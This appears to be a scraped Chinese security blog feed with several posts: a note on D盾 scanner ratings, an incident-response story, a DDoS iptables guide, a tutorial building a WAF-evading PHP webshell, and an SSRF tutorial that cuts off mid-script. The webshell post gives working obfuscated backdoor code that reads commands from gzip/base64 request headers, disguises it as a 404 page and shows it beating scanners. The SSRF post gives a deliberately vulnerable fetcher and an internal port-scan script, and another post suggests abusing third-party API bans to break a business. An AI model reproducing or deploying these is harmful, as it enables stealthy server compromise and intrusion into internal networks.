<p>D盾报的等级才是“1”，我们看下<code>file_put_contents</code>函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">file_put_contents(file,data,mode,context)</div><div class="line">file    必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</div><div class="line">data    可选。规定要写入文件的数据。可以是字符串、数组或数据流。</div><div class="line">mode    可选。规定如何打开/写入文件。可能的值：</div><div class="line">        FILE_USE_INCLUDE_PATH</div><div class="line">        FILE_APPEND</div><div class="line">        LOCK_EX</div><div class="line">context</div><div class="line">        可选。规定文件句柄的环境。</div><div class="line">        context 是一套可以修改流的行为的选项。若使用 null，则忽略。</div></pre></td></tr></table></figure></p>
<p>很明显，这个文件的名字要看后端怎么处理，如果是接收<code>POST</code>参数中的“K”，那就是自定义文件名了，就是不是，肯定也是会创建一个新的文件而文件内容就是<code>&lt;?php eval($_POST[k]);?&gt;</code>。</p>
<p>这种很明显不是正常操作啊，但是D盾竟然报等级为“1”！我们使用的时候  有时候会经常忽略等级“3”以下的文件，这就很危险啊。</p>
<p>我猜测：可能是由于D盾的策略是只要在他的规则里出现，就显示出来出现的第一条的那个等级。这明显不符合常理啊！</p>
<p>最起码要做个全文检测，然后把最高等级的给显示出来，这样，用户再人工排查，就不会出现漏报的情况了。（绕的咱就暂且不说）</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> webshell </tag>
            
            <tag> 应急响应 </tag>
            
            <tag> D盾 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[记一次奇葩的应急响应]]></title>
      <url>/2017/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E8%91%A9%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      <content type="html"><![CDATA[<p>上上上周末真是个不平凡的周末，周六公司举办“脉搏涌动”沙龙，虽然忙点，但是也是学到很多，况且还是自己第一次参加安全相关的会议。然后周末上午赶忙完成四爷安排的安全脉搏上的任务，写了个文章发到“安全脉搏”上。下午刚要出去吃饭，工作来了。。。<br><a id="more"></a><br>先说下自己在沙龙上学到的</p>
<ol>
<li>URL跳转的时候可以用<code>\@</code>绕过，<code>\</code>是利用浏览器和后端解析差异，<code>@</code>这个之前在ssrf上绕过用</li>
<li><code>/%0a/</code>这种形式可绕过一些目录限制以便进行其他操作，之前都用到crlf，waf等上</li>
<li>搜索敏感信息听说bing更强大，小伙伴还给我推荐了<a href="https://duckduckgo.com/" target="_blank" rel="external">DuckDuckGo</a></li>
</ol>
<p>总结起来就是：太年轻，年轻，轻。。。[捂脸][捂脸][捂脸]</p>
<p>好了，说下这次的应急响应及自己的思考。感谢加菲猫、四爷带我，跪拜啊！</p>
<h1 id="0x00-事件描述"><a href="#0x00-事件描述" class="headerlink" title="0x00 事件描述"></a>0x00 事件描述</h1><p>客户反馈从6月23日开始，网站访问延迟很大，重启服务之后会越来越慢，直至502。网站使用LNMP集成环境，服务器及数据库不是弱口令。6月25号客户买了相关安全产品，未发现明显的恶意攻击行为，同时服务器性能良好。</p>
<h1 id="0x01-事件处理过程"><a href="#0x01-事件处理过程" class="headerlink" title="0x01 事件处理过程"></a>0x01 事件处理过程</h1><p>首先我的第一反应是被D了，使用top发现服务器性能正常。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_1.png" alt=""></p>
<p>然后客户也买了产品，产品上也未出现异常。</p>
<p>然后使用了下自己做的信息收集的<a href="">linux_信息收集.sh</a>，搜集了下相关信息，查看也并没发现什么异常。</p>
<p>使用了Python版的webshell查杀，也TM没发现啥，各种看日志也并没发现什么卵用，这TM我就崩溃了。。。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_2.jpg" alt=""></p>
<p>然后我又考虑是不是Slow HTTP DDos，但是没办法验证啊。</p>
<p>本地复现的话客户肯定不让啊，无助啊。。。</p>
<p>没办法只能继续分析，然后事件出现了转机：</p>
<p>服务会呈现两种情况：</p>
<p>http资源未被占尽的情况下，可以访问静态资源以及直接查sql的路由链接，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://xxx/wap/test.css?v=1</div><div class="line">http://xxx/phpmyadmin/index.php</div></pre></td></tr></table></figure></p>
<p>http资源完全被占满，导致静态资源都不能访问，查询进程会发现最大50个httpd进程全启动了。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_3.png" alt=""></p>
<p>由于最大只允许50个进程，所以导致这个时候静态和动态的资源都无法进行访问了。<br>检查nginx日志，log中有大量的499状态码，这个是由于客户端等待超时，关闭了链接导致。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_4.png" alt=""></p>
<p>暂且在<code>proxy.conf</code>中新增了<code>proxy_ignore_client_abort on;</code></p>
<p>重启后，不在有客户端主动关闭链接的情况。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_5.png" alt=""></p>
<p>检查部分链接源代码函数，如在资源未占满情况下，访问此phpmyadmin/index.php请求是没问题的：</p>
<blockquote>
<p><a href="http://xxx/xxx/ajax.php" target="_blank" rel="external">http://xxx/xxx/ajax.php</a></p>
</blockquote>
<p>定位到<code>/data/wwwroot/xxx/ajax.action.php</code>文件，查看后发现就是一个简单的sql查询，然后打印了json。<br><img src="http://oa8y5guqs.bkt.clouddn.com/25_6.png" alt=""></p>
<p>然后访问 “找回密码链接” 每次延迟时间都在28.19秒左右，如下：</p>
<blockquote>
<p><a href="http://xxx/finduser/findpassword" target="_blank" rel="external">http://xxx/finduser/findpassword</a></p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_7.png" alt=""></p>
<p>于是定位到该方法的源代码函数位置，在渲染模版前，尝试<code>die(&#39;111111&#39;);</code>发现很快能显示111111</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">vi ./xxx/finduser.action.php</div><div class="line"></div><div class="line">$title = &quot;找回密码&quot;;</div><div class="line">die(&apos;1111111&apos;);</div><div class="line">include templates(&quot;mobile/user&quot;, &quot;findpassword&quot;);</div></pre></td></tr></table></figure>
<p>这说明模版在渲染前是没有问题的。</p>
<p>上边两步也就说明了：</p>
<ol>
<li>不会是攻击的造成的。</li>
<li>sql查询没问题。</li>
</ol>
<p>之后猜测两种情况：</p>
<ol>
<li>可能是缓存超时</li>
<li>也可能是连接某个第三方接口超时出现的问题</li>
</ol>
<p>重新刷新页面，并同时查看端口<code>syn_send</code>情况，果然发现了问题：</p>
<p><code>netstat -anp|grep -i syn_sent|awk &#39;{print $5}&#39;|sort|uniq</code></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_9.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">140.207.119.12:443</div><div class="line">58.246.220.31:443</div></pre></td></tr></table></figure>
<p>每访问加载慢的页面，就会多一个这个ip的链接出来。<br>浏览器访问后，发现ssl标识是微信的接口。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_10.png" alt=""></p>
<p>api.weixin.qq.com -&gt;  58.246.220.31<br>上边这个在服务器上是ping不通的。查看了下服务器上调用该api的文件。</p>
<p><code>find ./ -type f -name &quot;*.php&quot;|xargs grep &quot;api.weixin.qq.com&quot;</code></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_11.png" alt=""></p>
<p>注释掉/xxx/jssdk.class.php等页面中的api.weixin.qq.com访问不在慢了。</p>
<p>至此，事件问题定位成功。</p>
<h1 id="0x02-安全建议"><a href="#0x02-安全建议" class="headerlink" title="0x02 安全建议"></a>0x02 安全建议</h1><ol>
<li>最简单的，修改<code>/etc/hosts</code>。</li>
<li>和微信方取得联系，解封对api.weixin.qq.com的ip限制。</li>
<li>定位所有调用的api接口，看看还有哪些在服务器上是不能访问的，并进行替换。</li>
</ol>
<h1 id="0x03-事件思考"><a href="#0x03-事件思考" class="headerlink" title="0x03 事件思考"></a>0x03 事件思考</h1><p>事后我们和客户交流，客户反馈：由于不可描述的原因，可能用户举报了他们，所以可能是这样导致他们微信API被封。</p>
<p>事后想了想，这TM思路真是猥琐啊！！！</p>
<p>然后联想到之前猪猪侠小密圈说的</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_12.png" alt=""></p>
<p>所以，我们就可以利用这点，比如系统需要请求第三方API，那我们就可以构造恶意payload让服务器发送恶意的包或者频繁请求相关API，那么此接口就会被封掉，那么业务就崩了！</p>
]]></content>
      
        
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> linux </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux下DDos攻击处理方法]]></title>
      <url>/2017/06/18/linux%E4%B8%8BDDos%E6%94%BB%E5%87%BB%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>当我们的 Linux 服务器受到少量攻击时，这时候我们可以使用 iptables 来手动封禁这些攻击者的IP。</p>
<p>如果攻击比较大时，有时我们根本无法响应过来，iptables 基本也就无能为力了。</p>
<p>对于少量攻击处理的步骤应该是：获取IP –&gt; 封IP</p>
<h1 id="1、获取攻击者-IP"><a href="#1、获取攻击者-IP" class="headerlink" title="1、获取攻击者 IP"></a>1、获取攻击者 IP</h1><h2 id="1-1-通过-netstat-获取"><a href="#1-1-通过-netstat-获取" class="headerlink" title="1.1 通过 netstat 获取"></a>1.1 通过 netstat 获取</h2><p>如果攻击者攻击的是你的 Web 服务的话，默认是80端口，我们就可以使用下面的代码！</p>
<p>如果攻击的不是80端口的话，将下面的两个数字80改为你被攻击的端口即可！</p>
<p>如果你需要显示多条记录，请自己手动将 head -n20 调大即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -anlp|grep 80|grep tcp|awk &apos;&#123;print $5&#125;&apos;|awk -F: &apos;&#123;print $1&#125;&apos;|sort|uniq -c|sort -nr|head -n20 | netstat -ant |awk &apos;/:80/&#123;split($5,ip,&quot;:&quot;);++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;&apos; |sort -rn|head -n20</div></pre></td></tr></table></figure></p>
<h2 id="1-2-通过-tcpdump-获取"><a href="#1-2-通过-tcpdump-获取" class="headerlink" title="1.2 通过 tcpdump 获取"></a>1.2 通过 tcpdump 获取</h2><p>在使用之前，请确保您的系统已经安装了 tcpdump 。</p>
<p>Debian / Ubuntu 系列快速安装如下</p>
<blockquote>
<p>apt-get install -y tcpdump</p>
</blockquote>
<p>安装后，使用下面的代码即可。</p>
<p>需要注意的是， -i eth0 指的是你主网卡，如果你是 OpenVZ 的虚拟机的话，就改成您的网卡名venet0</p>
<p>同样你需要设置的是， port 80 设置你被攻击的端口， -c 1000 指 tcpdump 需要统计的记录数，他会在达到这个数之后显示结果。 head -20 设置你要显示的记录条数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F&quot;.&quot; &apos;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&apos; | sort | uniq -c | sort -nr |head -20</div></pre></td></tr></table></figure></p>
<h1 id="2、封禁-IP"><a href="#2、封禁-IP" class="headerlink" title="2、封禁 IP"></a>2、封禁 IP</h1><p>通过上面的步骤，我们已经知道是谁在攻击我们了，现在我们就可以将他们拉入 iptables 禁止他们连接到服务器了。</p>
<h2 id="2-1-封禁单个-IP"><a href="#2-1-封禁单个-IP" class="headerlink" title="2.1 封禁单个 IP"></a>2.1 封禁单个 IP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -I INPUT -s 211.1.2.1 -j DROP</div></pre></td></tr></table></figure>
<h2 id="2-2-封禁一个-IP-段"><a href="#2-2-封禁一个-IP-段" class="headerlink" title="2.2 封禁一个 IP 段"></a>2.2 封禁一个 IP 段</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -I INPUT -s 211.1.2.0/16 -j DROP</div></pre></td></tr></table></figure>
<p>如果需要更多关于 iptables 的教程，由于不在本帖需要讲述的内容当中，请自行 Google 答案。</p>
<p>来源：(<a href="https://imlonghao.com/8.html)[https://imlonghao.com/8.html" target="_blank" rel="external">https://imlonghao.com/8.html)[https://imlonghao.com/8.html</a>]</p>
]]></content>
      
        
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> tcpdump </tag>
            
            <tag> iptables </tag>
            
            <tag> linux </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透测试小技巧之过waf木马]]></title>
      <url>/2017/06/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E8%BF%87waf%E6%9C%A8%E9%A9%AC/</url>
      <content type="html"><![CDATA[<p>在研究webshell查杀的时候，学习别人怎么绕waf的思路，今天发现一个很6的函数(至少之前我是没见过)，然后结合之前写访问日志记录文件时用到的方法，very perfect！<br><a id="more"></a></p>
<h1 id="Once-step"><a href="#Once-step" class="headerlink" title="Once step"></a>Once step</h1><p>普通一句话木马：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval($_POST[&apos;caidao&apos;]);?&gt;</div></pre></td></tr></table></figure>
<h1 id="Second-step"><a href="#Second-step" class="headerlink" title="Second step"></a>Second step</h1><p>首先大家看下这个东西：<br><img src="http://oa8y5guqs.bkt.clouddn.com/webshell1.png" alt=""></p>
<p>不知道大家看到这个字符串会有啥想法，反正说实话，之前我肯定不会太在意。看下源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$compressed   = gzcompress(&apos;&lt;?php eval($_POST[\&apos;caidao\&apos;]);?&gt;&apos;, 9);</div><div class="line">$uncompressed = gzuncompress($compressed);</div><div class="line">echo $compressed;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h1 id="Third-step"><a href="#Third-step" class="headerlink" title="Third step"></a>Third step</h1><p>那么重点来了！</p>
<p>我要说的就是<code>gzcompress</code>这个函数。然后我又查了查相关资料，找到了PHP中具有相同功能的函数还有两个：<code>gzdeflate</code>，<code>gzencode</code>。</p>
<p>科普下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">压缩函数：gzcompress gzdeflate gzencode</div><div class="line">解压函数：gzuncompress gzinflate gzdecode</div><div class="line"></div><div class="line">gzdecode是PHP 5.4.0之后才加入的，使用的时候要注意兼容性问题。</div><div class="line">这几个函数都以gz开头，让人想到gzip压缩，而光看函数名却又看不出它们之间的区别，只能查文档。</div><div class="line">gzcompress gzdeflate gzencode函数的区别在于它们压缩的数据格式不同：</div><div class="line">gzcompress使用的是ZLIB格式；</div><div class="line">gzdeflate使用的是纯粹的DEFLATE格式；</div><div class="line">gzencode使用的是GZIP格式；</div><div class="line"></div><div class="line">其实从PHP 5.4.0开始，这三个函数是一样的，只不过第三个参数的默认值不同；如果调用时传入第三个参数，那么这三个函数返回的数据相同。</div><div class="line"></div><div class="line">有兴趣的自己在找找吧</div></pre></td></tr></table></figure></p>
<h1 id="Fourth-step"><a href="#Fourth-step" class="headerlink" title="Fourth step"></a>Fourth step</h1><p>写个生成密文的文件。</p>
<p>考虑到可能字符显示不全，无法识别等原因，再套一层base64。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if(isset($_POST[&apos;str&apos;]))&#123;</div><div class="line">	$str = $_POST[&apos;str&apos;];</div><div class="line">	$compressed = base64_encode(gzcompress($str, 9));</div><div class="line">	echo $compressed;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h1 id="Fifth-step"><a href="#Fifth-step" class="headerlink" title="Fifth step"></a>Fifth step</h1><p>结合访问日志记录用到的<code>getallheaders</code>函数，最终的webshell如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&apos;w2n1ck&apos;])));&gt;</div></pre></td></tr></table></figure>
<p>用D盾查一下</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell2.png" alt=""></p>
<p>虽然级别是小于3，但是说明里面显示可能eval后门，所以要去掉这个，在变形下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php $w2n1ck1=gzuncompress(base64_decode(getallheaders()[&apos;cai&apos;]));$w2n1ck1(gzuncompress(base64_decode(getallheaders()[&apos;dao&apos;])));&gt;</div></pre></td></tr></table></figure></p>
<p>看下webshell可用性</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell3.png" alt=""></p>
<p>这里注意下，使用eval的话会报错，具体的原因请查看<a href="https://stackoverflow.com/questions/29707896/undefined-function-eval-php" target="_blank" rel="external">错误详情</a></p>
<p>在安利下命令执行的一些函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;`&apos;,eval,assert,exec,passthru,shell_exec,system,putenv,preg_replace,pcntl_exec,popen,proc_open</div></pre></td></tr></table></figure></p>
<h1 id="Sixth-step"><a href="#Sixth-step" class="headerlink" title="Sixth step"></a>Sixth step</h1><p>再用D盾检测下<br><img src="http://oa8y5guqs.bkt.clouddn.com/webshell4.png" alt=""></p>
<p>还是可疑啊，那行再伪造伪造下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line">&lt;?php</div><div class="line">$cai=getallheaders()[&apos;cai&apos;];</div><div class="line">$dao=getallheaders()[&apos;dao&apos;];</div><div class="line">if($cai!=&quot;&quot; and $dao!=&quot;&quot;)&#123;</div><div class="line">  $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao)));</div><div class="line">&#125;</div><div class="line">header(&apos;HTTP/1.1 404 Not Found&apos;);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>再检测下：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell5.png" alt=""><br>360 5引擎检测下<br><img src="http://oa8y5guqs.bkt.clouddn.com/webshell7.png" alt=""><br>very perfect！</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell6.png" alt=""></p>
<p>如果觉得自己添加头麻烦可疑使用自带的请求头字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">getallheaders()[&apos;Accept-Language&apos;]</div><div class="line">getallheaders()[&apos;User-Agent&apos;]</div><div class="line">getallheaders()[&apos;Accept&apos;]</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> PHP </tag>
            
            <tag> webshell </tag>
            
            <tag> D盾 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSRF漏洞剖析与利用]]></title>
      <url>/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>最近玩的时候想找一下SSRF的相关知识，去自己博客上一看，WTF竟然还没有！好吧。。那就写一个吧，方便自己以后查看，大牛们多多指点。<br><a id="more"></a></p>
<h1 id="Know-it"><a href="#Know-it" class="headerlink" title="Know it"></a>Know it</h1><p>(让我装个逼，模仿下猪猪侠的词。。。)</p>
<h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><p>Freebuf:很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side Request Forgery）</p>
<p>一句话就是：利用一个可以发起网络请求的服务，当作跳板来攻击其他服务。</p>
<h2 id="SSRF能干什么"><a href="#SSRF能干什么" class="headerlink" title="SSRF能干什么"></a>SSRF能干什么</h2><ul>
<li>探测内网信息</li>
<li>攻击内网或本地其他服务</li>
<li>穿透防火墙</li>
<li>。。。</li>
</ul>
<h2 id="怎么找SSRF漏洞"><a href="#怎么找SSRF漏洞" class="headerlink" title="怎么找SSRF漏洞"></a>怎么找SSRF漏洞</h2><ul>
<li>能够对外发起网络请求的地方</li>
<li>请求远程服务器资源的地方</li>
<li>数据库内置功能</li>
<li>邮件系统</li>
<li>文件处理</li>
<li>。。。</li>
</ul>
<p>举几个例子：</p>
<ul>
<li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li>
<li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li>
<li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li>
<li>邮件系统就是接收邮件服务器地址这些地方。</li>
<li>文件就找ImageMagick，xml这些。</li>
<li>从URL关键字中寻找，比如：<code>source</code>,<code>share</code>,<code>link</code>,<code>src</code>,<code>imageurl</code>,<code>target</code>等。</li>
</ul>
<h2 id="SSRF怎么形成的"><a href="#SSRF怎么形成的" class="headerlink" title="SSRF怎么形成的"></a>SSRF怎么形成的</h2><p>SSRF形成的原因就是由于服务端提供了能够发起网络请求或者从其他服务器获取相关资源数据等，但是没有对相关目标地址做任何的限制或过滤，从而导致SSRF漏洞。</p>
<h1 id="Hack-it"><a href="#Hack-it" class="headerlink" title="Hack it"></a>Hack it</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>主要模仿curl来请求资源，写入相关文件，之后并显示相关数据。</p>
<p><strong>ssrf.html</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">	&lt;title&gt;ssrf test&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;center&gt;</div><div class="line">	&lt;form name=&quot;input&quot; action=&quot;ssrf.php&quot; method=&quot;POST&quot;&gt;</div><div class="line">	&lt;h2&gt;Search: &lt;input type=&quot;text&quot; name=&quot;url&quot;&gt;&lt;/h2&gt;</div><div class="line">	&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/center&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p><strong>ssrf.php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(isset($_POST[&apos;url&apos;]))&#123;</div><div class="line">   $link = $_POST[&apos;url&apos;];</div><div class="line">   $filename = &apos;./&apos;.rand().&apos;.txt&apos;;</div><div class="line">   $curlobj = curl_init($link);</div><div class="line">   $fp = fopen($filename,&quot;w&quot;);</div><div class="line">   curl_setopt($curlobj,CURLOPT_FILE,$fp);</div><div class="line">   curl_setopt($curlobj,CURLOPT_HEADER,0);</div><div class="line">   curl_exec($curlobj);</div><div class="line">   curl_close($curlobj);</div><div class="line">   fclose($fp);</div><div class="line">   $fp = fopen($filename,&quot;r&quot;);</div><div class="line">   $result = fread($fp,filesize($filename));</div><div class="line">   fclose($fp);</div><div class="line">   echo $result;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>这里使用192.168.1.113作为边界服务器，192.168.2.3作为内网服务器。<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf1.png" alt=""><br>数据内网服务器地址<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf2.png" alt=""><br>成功显示内网服务器信息</p>
<h2 id="漏洞实践"><a href="#漏洞实践" class="headerlink" title="漏洞实践"></a>漏洞实践</h2><p>这里以weblogic的SSRF为例(猪猪侠所说的神洞)。如图显示则就是存在SSRF漏洞了。<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf3.png" alt=""></p>
<p>好了，到现在咱们已经知道存在这个漏洞了，然后应该怎样快速定位该服务器所在的内网地址呢?</p>
<p>这里目前我知道的有三种方法：</p>
<ol>
<li>使用脚本爆破<code>192.168.*.*</code>，<code>172.16.*.*-172.31.*.*</code>，<code>10.*.*.*</code>这三个内网段</li>
<li>使用burp爆破同上</li>
<li>使用<code>file:///</code> ，<code>gophar://</code>，<code>ftp://</code>等这些服务器允许的协议去读取proc里可能包含IP地址信息的相关文件</li>
</ol>
<p>这里我就先简单粗暴的使用burp来一发吧。<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf4.png" alt=""></p>
<p>。。。运气真特么的好。</p>
<h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>探测内网内的所有主机及开放的端口信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Author：w2n1ck</div><div class="line">@Index：http://www.w2n1ck.com/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import Queue</div><div class="line">from threading import Thread</div><div class="line">import threading</div><div class="line">import urllib</div><div class="line">import urllib2</div><div class="line">import re</div><div class="line">import requests</div><div class="line"></div><div class="line">base_url = &apos;http://xxx.xxx.xxx&apos;</div><div class="line">thread_list=[]</div><div class="line"></div><div class="line">port_list = [21,22,23,25,69,80,81,82,83,84,110,389,398,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]</div><div class="line"></div><div class="line">que = Queue.Queue()</div><div class="line">lock = threading.Lock()</div><div 